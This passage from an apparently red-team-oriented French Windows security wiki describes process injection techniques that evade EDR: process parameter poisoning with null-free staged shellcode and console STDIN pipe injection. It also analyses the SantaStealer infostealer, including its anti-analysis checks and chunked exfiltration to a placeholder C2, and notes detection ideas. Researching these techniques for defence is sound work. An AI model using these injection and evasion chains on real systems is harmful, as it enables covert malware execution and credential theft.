4. Lire `RTL_USER_PROCESS_PARAMETERS`
5. Utiliser le pointeur sélectionné :
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flux minimal :

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Exécution du buffer de paramètres copié

La région de paramètres copiée est généralement `RW`, et non exécutable. Une chaîne P3 courante consiste à :

1. Créer le processus normalement (sans le suspendre)
2. Rendre la page de paramètres choisie exécutable avec `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Réutiliser le handle du thread principal déjà renvoyé dans `PROCESS_INFORMATION`
4. Rediriger l’exécution avec `NtSetContextThread` (`CONTEXT_CONTROL`, écraser `RIP`)

Contrairement aux workflows classiques de détournement de thread, cela ne nécessite **pas** `SuspendThread` / `ResumeThread` ; le contexte peut être modifié directement via le handle du thread principal renvoyé.

Cela évite plusieurs API couramment surveillées pour l’injection :

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- souvent aussi `SuspendThread` / `ResumeThread`

### Limitation des octets nuls et shellcode en plusieurs étapes

Les trois vecteurs sont des **données sous forme de chaîne ou assimilées à une chaîne** ; une payload brute contenant `0x00` est donc tronquée lors du transfert. Une solution pratique consiste à utiliser un **premier stage sans octets nuls**, qui reconstruit les constantes à l’exécution, puis charge un second stage arbitraire.

Un modèle simple consiste à synthétiser les constantes avec XOR :

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Cela permet au premier stage de construire des chaînes sur la pile, des arguments d’API, des chemins de DLL ou un chargeur de shellcode de second stage sans intégrer d’octets nuls dans le paramètre transmis.

### Appels d’API basés sur la pile depuis le premier stage

Lorsque le premier stage doit appeler des API telles que `LoadLibraryA`, il peut :

- pousser la chaîne/le buffer sur la pile de la cible
- réserver les **32 octets de shadow space x64**
- définir `RCX`, `RDX`, `R8`, `R9` avec des constantes ou des pointeurs relatifs à `RSP`
- maintenir l’alignement de `RSP` sur **16 octets** avant l’appel

Un second stage peut ensuite être copié depuis la pile dans une allocation `PAGE_READWRITE`, passée à `PAGE_EXECUTE_READ` avec `VirtualProtect`, puis exécutée par un saut, évitant ainsi une allocation RWX directe.

### Pistes de détection

Les auteurs mentionnent les possibilités de détection suivantes :

- `VirtualProtectEx` / `NtProtectVirtualMemory` rendant exécutables les pages des paramètres du processus
- ce changement de protection suivi de `SetThreadContext` / `NtSetContextThread`
- lectures à distance du `PEB`, puis de `RTL_USER_PROCESS_PARAMETERS`
- valeurs `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` inhabituellement longues ou à haute entropie lors de la création du processus

### Remarques

- P3 est une **technique de transfert interprocessus**, et non une primitive d’exécution complète à elle seule : le paramètre copié nécessite toujours un changement des permissions d’exécution et une méthode de redirection de l’exécution.
- `RtlCreateProcessReflection` / Dirty Vanity a été envisagé par les auteurs, mais écarté, car il fait appel en interne à des primitives suspectes telles que `NtWriteVirtualMemory` et `NtCreateThreadEx`.

## Injection par pipe STDIN de la console

Un processus enfant de console interactif peut également servir de **primitive de transfert de payload**. L’injecteur redirige l’entrée standard de l’enfant vers un pipe et envoie un marqueur suivi du shellcode. Une fois les données lues par le programme de console dans sa propre mémoire privée, l’injecteur trouve ce buffer, le rend exécutable et y redirige un thread de l’enfant. Cela évite `VirtualAllocEx` et `WriteProcessMemory`, mais il s’agit toujours d’injection de processus, et non d’un contournement EDR général.<sup>[[41]](#references)</sup>

Malgré la description « named-pipe », l’implémentation de référence appelle `CreatePipe`, qui crée un **pipe anonyme**. Windows implémente les pipes anonymes à l’aide d’objets pipe portant des noms uniques en interne, mais le PoC ne choisit pas de chemin `\\.\pipe\<name>` et n’appelle pas `CreateNamedPipe`. Il crée des handles héritables avec un descripteur de sécurité par défaut, place le handle de lecture dans `STARTUPINFO.hStdInput`, définit `STARTF_USESTDHANDLES` et lance un nouveau processus enfant avec l’héritage des handles activé. Par conséquent, ce PoC lance l’exécutable de console fourni ; il ne connecte pas son pipe à un processus existant.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Déroulement de référence

L’implémentation suit la chaîne suivante :<sup>[[41]](#references)</sup>

1. Créer des paires de pipes anonymes pour `STDIN` et `STDOUT` de l’enfant. Désactiver l’héritage sur les deux handles côté parent et fermer les doublons côté enfant dans le parent après la création du processus.
2. Lancer un exécutable interactif tel que `netsh.exe` ou `nslookup.exe` avec `CREATE_NEW_CONSOLE`. L’enfant hérite des handles standard redirigés.
3. Envoyer le tableau binaire complet `rawData` avec `WriteFile` via le handle `STDIN` côté parent. Le programme de console consomme les octets et en laisse une copie dans l’une de ses régions privées validées.
4. Parcourir l’espace d’adressage de l’enfant avec `VirtualQueryEx`, lire les régions candidates `MEM_PRIVATE` avec `ReadProcessMemory` et rechercher le marqueur au début de `rawData`.
5. Passer le buffer découvert à `PAGE_EXECUTE_READWRITE` avec `VirtualProtectEx`.
6. Identifier le thread principal, le suspendre, définir `RIP` sur `found_address + 0x19` avec `NtSetContextThread`, puis le reprendre.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L’implémentation fournie est spécifique à x64 : elle modifie `CONTEXT.Rip`, et sa charge utile intégrée est du shellcode x64. `rawData` commence par un marqueur de 25 octets ; les octets exécutables commencent donc à l’offset hexadécimal `0x19`. Lors du remplacement de la charge utile, préservez cette disposition ou mettez à jour ensemble le marqueur, le vecteur de recherche, la taille du tableau et l’offset d’exécution. Les commentaires du code source indiquent également `0x0A`, `0x0D` et `0x1A` comme caractères interdits. Ce workflow ne modifie ni le jeton ni les privilèges du processus enfant.<sup>[[41]](#references)</sup>

Pour des helpers natifs légers et des modèles de compilation de charges utiles, voir [Charges utiles C pour Windows](windows-local-privilege-escalation/windows-c-payloads.md).

## Techniques de SantaStealer pour l’évasion sans fichier et le vol d’identifiants

SantaStealer (alias BluelineStealer) montre comment les infostealers modernes combinent le contournement antivirus, l’anti-analyse et l’accès aux identifiants dans un même workflow.<sup>[[24]](#references)</sup>

### Filtrage par disposition de clavier et délai en sandbox

- Un indicateur de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est détectée, l’échantillon crée un marqueur `CIS` vide et se termine avant de lancer les stealers, évitant ainsi de s’exécuter dans les régions exclues tout en laissant une trace utile à la détection.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logique `check_antivm` à plusieurs niveaux

- La variante A parcourt la liste des processus, calcule le hash de chaque nom avec une somme de contrôle glissante personnalisée et le compare à des listes de blocage intégrées visant les debuggers/sandboxes. Elle recalcule la somme de contrôle pour le nom de l’ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- La variante B examine les propriétés du système (seuil minimal du nombre de processus, temps de fonctionnement récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox et effectue des vérifications temporelles autour des pauses pour repérer l’exécution pas à pas. Toute détection interrompt l’exécution avant le lancement des modules.

### Helper sans fichier + chargement réflexif avec double ChaCha20

- La DLL/EXE principale intègre un helper Chromium de récupération d’identifiants, qui est soit écrit sur le disque, soit mappé manuellement en mémoire. En mode sans fichier, il résout lui-même les imports et les relocations, de sorte qu’aucun artefact du helper n’est écrit.
- Ce helper stocke une DLL de deuxième étape chiffrée deux fois avec ChaCha20 (deux clés de 32 octets et deux nonces de 12 octets). Après les deux déchiffrements, il charge le blob de manière réflexive (sans `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Les routines ChromElevator utilisent le process hollowing réflexif par appels système directs pour injecter le code dans un navigateur Chromium actif, hériter des clés AppBound Encryption et déchiffrer les mots de passe, les cookies et les cartes de crédit directement depuis les bases de données SQLite, malgré le renforcement d’ABE.


### Collecte modulaire en mémoire et exfiltration HTTP par blocs

- `create_memory_based_log` parcourt une table globale de pointeurs de fonction `memory_generators` et lance un thread par module activé (Telegram, Discord, Steam, captures d’écran, documents, extensions de navigateur, etc.). Chaque thread écrit ses résultats dans des tampons partagés et indique le nombre de fichiers après une attente de jointure d’environ 45 s.
- Une fois la collecte terminée, tout est compressé avec la bibliothèque `miniz` liée statiquement sous `%TEMP%\\Log.zip`. `ThreadPayload1` attend ensuite 15 s et transmet l’archive par HTTP POST, par blocs de 10 Mo, à `http://<C2>:6767/upload`, en usurpant une boundary de navigateur `multipart/form-data` (`----WebKitFormBoundary***`). Chaque bloc ajoute `User-Agent: upload`, `auth: <build_id>`, un en-tête facultatif `w: <campaign_tag>`, et le dernier bloc ajoute `complete: true` pour signaler au C2 que la réassemblage est terminé.

## References

- [1] [Techniques d’évasion avancées : précision du module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Piles d’appels : fini les passe-droits pour les malwares](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemple](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemple](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC d’usurpation de pile d’appels](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nouvelle chaîne d’infection et obfuscation basée sur ConfuserEx pour le stealer DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Faut-il faire confiance au zero trust ? Contourner les contrôles de posture de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Avant ToolShell : exploration des précédentes opérations de ransomware de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading : exploitation des exports transférés](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventaire des exports transférés de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordre de recherche des bibliothèques de liens dynamiques](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sécurité des processus et droits d’accès](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Référence EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Lanceur CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrer les EDR grâce à la protection Processus protégé léger (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Briser la coque protectrice de Windows Defender avec la technique de redirection de dossier](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Référence de la commande mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sous le rideau pur : du RAT au builder, puis au développeur](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arrive en ville : un nouveau voleur d’informations ambitieux](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Déchiffrement de Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader : neutraliser les malwares Node.js grâce au traçage des API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La Belle au bois dormant : mettre Adaptix au lit avec Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Empoisonnement des paramètres de processus](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La Belle au bois dormant II : CFG, CET et usurpation de pile](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation du sommeil avec Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Masquer votre ETW Dotnet](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuser de Chrome Remote Desktop lors d’opérations Red Team : guide pratique](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged : transformer le pilote de remédiation de Defender en primitive d’opération noyau](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Code associé à Function Peekaboo de MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo : créer des fonctions auto-masquantes avec LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Code source d’InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Fonction CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Créer un processus enfant avec redirection des entrées et sorties](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
